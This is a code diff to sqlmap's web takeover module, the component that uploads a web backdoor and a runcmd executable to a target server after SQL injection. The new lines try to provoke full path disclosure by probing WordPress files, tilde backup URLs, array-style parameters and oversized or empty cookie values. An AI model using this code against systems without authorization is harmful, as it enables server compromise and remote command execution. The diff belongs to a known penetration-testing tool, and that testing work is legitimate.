@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 
 """
-Copyright (c) 2006-2016 sqlmap developers (http://sqlmap.org/)
+Copyright (c) 2006-2017 sqlmap developers (http://sqlmap.org/)
 See the file 'doc/COPYING' for copying permission
 """
 
@@ -26,6 +26,7 @@ from lib.core.common import ntToPosixSlashes
 from lib.core.common import isTechniqueAvailable
 from lib.core.common import isWindowsDriveLetterPath
 from lib.core.common import normalizePath
+from lib.core.common import parseFilePaths
 from lib.core.common import posixToNtSlashes
 from lib.core.common import randomInt
 from lib.core.common import randomStr
@@ -38,8 +39,10 @@ from lib.core.data import kb
 from lib.core.data import logger
 from lib.core.data import paths
 from lib.core.enums import DBMS
+from lib.core.enums import HTTP_HEADER
 from lib.core.enums import OS
 from lib.core.enums import PAYLOAD
+from lib.core.enums import PLACE
 from lib.core.enums import WEB_API
 from lib.core.exception import SqlmapNoneDataException
 from lib.core.settings import BACKDOOR_RUN_CMD_TIMEOUT
@@ -116,7 +119,7 @@ class Web:
                 multipartParams['__EVENTVALIDATION'] = kb.data.__EVENTVALIDATION
                 multipartParams['__VIEWSTATE'] = kb.data.__VIEWSTATE
 
-            page = Request.getPage(url=self.webStagerUrl, multipart=multipartParams, raise404=False)
+            page, _, _ = Request.getPage(url=self.webStagerUrl, multipart=multipartParams, raise404=False)
 
             if "File uploaded" not in page:
                 warnMsg = "unable to upload the file through the web file "
@@ -196,9 +199,71 @@ class Web:
                 self.webApi = choices[int(choice) - 1]
                 break
 
+        if not kb.absFilePaths:
+            message = "do you want sqlmap to further try to "
+            message += "provoke the full path disclosure? [Y/n] "
+
+            if readInput(message, default='Y', boolean=True):
+                headers = {}
+                been = set([conf.url])
+
+                for match in re.finditer(r"=['\"]((https?):)?(//[^/'\"]+)?(/[\w/.-]*)\bwp-", kb.originalPage, re.I):
+                    url = "%s%s" % (conf.url.replace(conf.path, match.group(4)), "wp-content/wp-db.php")
+                    if url not in been:
+                        try:
+                            page, _, _ = Request.getPage(url=url, raise404=False, silent=True)
+                            parseFilePaths(page)
+                        except:
+                            pass
+                        finally:
+                            been.add(url)
+
+                url = re.sub(r"(\.\w+)\Z", "~\g<1>", conf.url)
+                if url not in been:
+                    try:
+                        page, _, _ = Request.getPage(url=url, raise404=False, silent=True)
+                        parseFilePaths(page)
+                    except:
+                        pass
+                    finally:
+                        been.add(url)
+
+                for place in (PLACE.GET, PLACE.POST):
+                    if place in conf.parameters:
+                        value = re.sub(r"(\A|&)(\w+)=", "\g<2>[]=", conf.parameters[place])
+                        if "[]" in value:
+                            page, headers = Request.queryPage(value=value, place=place, content=True, raise404=False, silent=True, noteResponseTime=False)
+                            parseFilePaths(page)
+
+                cookie = None
+                if PLACE.COOKIE in conf.parameters:
+                    cookie = conf.parameters[PLACE.COOKIE]
+                elif headers and HTTP_HEADER.SET_COOKIE in headers:
+                    cookie = headers[HTTP_HEADER.SET_COOKIE]
+
+                if cookie:
+                    value = re.sub(r"(\A|;)(\w+)=[^;]*", "\g<2>=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", cookie)
+                    if value != cookie:
+                        page, _ = Request.queryPage(value=value, place=PLACE.COOKIE, content=True, raise404=False, silent=True, noteResponseTime=False)
+                        parseFilePaths(page)
+
+                    value = re.sub(r"(\A|;)(\w+)=[^;]*", "\g<2>=", cookie)
+                    if value != cookie:
+                        page, _ = Request.queryPage(value=value, place=PLACE.COOKIE, content=True, raise404=False, silent=True, noteResponseTime=False)
+                        parseFilePaths(page)
+
         directories = list(arrayizeValue(getManualDirectories()))
         directories.extend(getAutoDirectories())
         directories = list(oset(directories))
+
+        path = urlparse.urlparse(conf.url).path or '/'
+        if path != '/':
+            _ = []
+            for directory in directories:
+                _.append(directory)
+                if not directory.endswith(path):
+                    _.append("%s/%s" % (directory.rstrip('/'), path.strip('/')))
+            directories = _
 
         backdoorName = "tmpb%s.%s" % (randomStr(lowercase=True), self.webApi)
         backdoorContent = decloak(os.path.join(paths.SQLMAP_SHELL_PATH, "backdoor.%s_" % self.webApi))
@@ -305,7 +370,7 @@ class Web:
 
                 _ = "tmpe%s.exe" % randomStr(lowercase=True)
                 if self.webUpload(backdoorName, backdoorDirectory, content=backdoorContent.replace("WRITABLE_DIR", backdoorDirectory).replace("RUNCMD_EXE", _)):
-                    self.webUpload(_, backdoorDirectory, filepath=os.path.join(paths.SQLMAP_SHELL_PATH, 'runcmd.exe_'))
+                    self.webUpload(_, backdoorDirectory, filepath=os.path.join(paths.SQLMAP_EXTRAS_PATH, "runcmd", "runcmd.exe_"))
                     self.webBackdoorUrl = "%s/Scripts/%s" % (self.webBaseUrl, backdoorName)
                     self.webDirectory = backdoorDirectory
                 else:
@@ -325,9 +390,8 @@ class Web:
 
                     message = "do you want to try the same method used "
                     message += "for the file stager? [Y/n] "
-                    getOutput = readInput(message, default="Y")
 
-                    if getOutput in ("y", "Y"):
+                    if readInput(message, default='Y', boolean=True):
                         self._webFileInject(backdoorContent, backdoorName, directory)
                     else:
                         continue
